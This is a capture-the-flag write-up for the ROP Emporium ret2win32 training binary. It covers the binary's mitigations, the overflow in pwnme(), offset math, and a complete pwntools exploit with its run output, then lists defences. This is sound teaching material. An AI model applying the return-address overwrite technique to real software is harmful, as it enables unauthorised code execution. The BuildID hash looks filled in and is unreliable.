# ret2win32 - ROP Emporium Challenge Writeup

## Challenge Overview

The `ret2win32` binary is the first challenge in the ROP Emporium series, designed to teach basic return-oriented programming concepts. This is a classic stack buffer overflow challenge where we need to redirect execution to a "win" function.

## Binary Analysis

### Basic Information
```bash
$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735c8ac7ac1e3e8e5b5e5e5e5e5e5e5e5e5e5e5, not stripped
```

### Security Mitigations
```bash
$ checksec --file=ret2win32
[*] '/home/kali/pwn/ROP/ropemporium/ret2win/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**Key Security Features:**
- ✅ **NX Enabled**: Stack is not executable (no shellcode injection)
- ❌ **No Stack Canary**: No stack corruption detection
- ❌ **No PIE**: Fixed memory addresses (predictable)
- ❌ **Partial RELRO**: GOT can be overwritten (not relevant here)

## Source Code Analysis

From the decompiled source code (`ret2win32.c`), we can see:

### Main Function
```c
int main(int argc, char ** argv) {
    setvbuf(g1, NULL, 2, 0);
    puts("ret2win by ROP Emporium");
    puts("x86\n");
    pwnme();  // Vulnerable function
    puts("\nExiting");
    return 0;
}
```

### Vulnerable Function
```c
int32_t pwnme(void) {
    int32_t buf; // bp-44, actually a 32-byte buffer
    memset(&buf, 0, 32);
    puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
    puts("What could possibly go wrong?");
    puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
    printf("> ");
    read(0, &buf, 56);  // ⚠️ VULNERABILITY: Reads 56 bytes into 32-byte buffer
    return puts("Thank you!");
}
```

**Vulnerability**: The `read()` function reads up to 56 bytes into a 32-byte buffer, allowing us to overflow and overwrite the return address.

## Assembly Analysis

### pwnme() Function Disassembly
```assembly
0x080485ad <+0>:  push   ebp
0x080485ae <+1>:  mov    ebp,esp
0x080485b0 <+3>:  sub    esp,0x28        ; Allocate 40 bytes (0x28) on stack
...
0x080485ba <+13>: lea    eax,[ebp-0x28]  ; Buffer starts at ebp-40
0x080485bd <+16>: push   eax
0x080485be <+17>: call   0x8048410 <memset@plt>
...
0x08048609 <+92>: push   0x38            ; read() size = 56 bytes (0x38)
0x0804860b <+94>: lea    eax,[ebp-0x28]  ; Buffer address
0x0804860e <+97>: push   eax
0x0804860f <+98>: push   0x0
0x08048611 <+100>: call   0x80483b0 <read@plt>
```

### ret2win() Target Function
```assembly
0x0804862c <+0>:  push   ebp
0x0804862d <+1>:  mov    ebp,esp
0x0804862f <+3>:  sub    esp,0x8
0x08048635 <+9>:  push   0x80487f6       ; "Well done! Here's your flag:"
0x0804863a <+14>: call   0x80483d0 <puts@plt>
0x08048645 <+25>: push   0x8048813       ; "/bin/cat flag.txt"
0x0804864a <+30>: call   0x80483e0 <system@plt>
0x08048654 <+40>: ret
```

**Target Function**: `ret2win()` at address `0x0804862c` prints a success message and executes `system("/bin/cat flag.txt")`.

## Stack Layout Analysis

### Memory Layout
```
High Memory
┌─────────────────┐
│  Return Address │ ← [ebp+4] (TARGET)
├─────────────────┤
│   Saved EBP     │ ← [ebp] (4 bytes)
├─────────────────┤
│   Padding       │ ← [ebp-8] to [ebp-1] (8 bytes)
├─────────────────┤
│                 │
│   Buffer        │ ← [ebp-40] to [ebp-9] (32 bytes)
│   (32 bytes)    │
│                 │
└─────────────────┘
Low Memory
```

### Offset Calculation
- **Buffer size**: 32 bytes
- **Padding**: 8 bytes (for alignment)
- **Saved EBP**: 4 bytes
- **Total offset to return address**: 32 + 8 + 4 = **44 bytes**

## Exploitation Strategy

### Step 1: Identify the Target
- We need to redirect execution to `ret2win()` function
- Address: `0x0804862c`

### Step 2: Calculate Overflow Offset
- Buffer overflow allows us to overwrite return address
- Offset: 44 bytes to reach return address

### Step 3: Craft Payload
```python
offset = 44
ret2win_addr = 0x0804862c
payload = b'A' * offset + p32(ret2win_addr)
```

### Step 4: Execute Exploit
```python
p = process('./ret2win32')
p.sendlineafter(b'> ', payload)
flag = p.recvall().decode()
print(flag)
```

## Proof of Concept Exploit

### Basic Exploit (`exploit.py`)
```python
from pwn import *

# Set the context of the binary
elf = context.binary = ELF('./ret2win32')

# The process to interact with
p = process(elf.path)

# Address of the ret2win function
ret2win_addr = 0x0804862c

# The offset to the return address on the stack
offset = 44

# Craft the payload
# 1. Fill the buffer with junk data up to the return address
# 2. Overwrite the return address with the address of ret2win()
payload = b'A' * offset + p32(ret2win_addr)

# Send the payload
p.sendlineafter(b'> ', payload)

# Receive and print the flag
flag = p.recvall().decode()
print(flag)
```

### Execution Result
```bash
$ python3 exploit.py
[*] '/home/kali/pwn/ROP/ropemporium/ret2win/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/kali/pwn/ROP/ropemporium/ret2win/ret2win32': pid 230242
[+] Receiving all data: Done (73B)
[*] Process '/home/kali/pwn/ROP/ropemporium/ret2win/ret2win32' stopped with exit code -11 (SIGSEGV) (pid 230242)
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

## Key Learning Points

### 1. Stack Buffer Overflow Basics
- Understanding how function calls work on the stack
- Identifying vulnerable functions that don't check buffer bounds
- Calculating precise offsets to overwrite return addresses

### 2. Return-Oriented Programming Introduction
- Instead of injecting shellcode (blocked by NX), we redirect to existing code
- The "ret2win" technique: jumping to a pre-existing "win" function
- This is the foundation for more complex ROP chains

### 3. Binary Analysis Techniques
- Using tools like `checksec`, `objdump`, `nm`, and `gdb`
- Reading assembly code to understand program flow
- Identifying security mitigations and their implications

### 4. Exploit Development Process
- Static analysis to understand the vulnerability
- Dynamic analysis to confirm behavior
- Payload crafting and testing
- Iterative refinement

## Defensive Measures

To prevent this type of attack:

1. **Stack Canaries**: Detect stack corruption before return
2. **ASLR/PIE**: Randomize memory layout to make addresses unpredictable
3. **Bounds Checking**: Use safe functions like `fgets()` instead of `read()`
4. **Input Validation**: Validate input length before processing
5. **Modern Compilers**: Use compiler flags like `-fstack-protector`

## Conclusion

The `ret2win32` challenge demonstrates the fundamental concepts of stack buffer overflow exploitation and return-oriented programming. By understanding how function calls work on the stack and identifying vulnerable code patterns, we can redirect program execution to achieve our goals.

This challenge serves as an excellent introduction to binary exploitation, teaching essential skills that form the foundation for more advanced techniques in the ROP Emporium series.

---

**Files in this directory:**
- `ret2win32` - The vulnerable binary
- `ret2win32.c` - Decompiled source code
- `exploit.py` - Working proof-of-concept exploit
- `detailed_analysis.py` - Comprehensive analysis script
- `flag.txt` - Flag file read by the ret2win function
- `WRITEUP.md` - This detailed writeup
